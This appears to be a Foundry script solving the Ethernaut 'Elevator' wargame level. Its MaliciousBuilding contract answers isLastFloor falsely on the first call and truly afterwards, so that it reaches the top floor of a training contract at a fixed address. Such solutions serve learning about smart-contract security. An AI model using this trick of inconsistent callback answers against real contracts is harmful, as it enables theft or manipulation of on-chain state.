// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {EthernautL12} from "../src/EthernautL12.sol";
import {Building} from "../src/EthernautL12.sol";

contract MaliciousBuilding is Building {
    EthernautL12 public ethernautl12 =
        EthernautL12(0xd1F2cdd7cd9A6fE731100245353EE1dbD030abc8);
    bool public firstCall;

    function isLastFloor(uint256) public override returns (bool) {
        if (!firstCall) {
            firstCall = true;
            return false;
        } else {
            return true;
        }
    }

    function attack() public {
        ethernautl12.goTo(1);
    }
}

contract EthernautL12Script is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        MaliciousBuilding maliciousBuilding = new MaliciousBuilding();
        maliciousBuilding.attack();
        vm.stopBroadcast();
    }
}
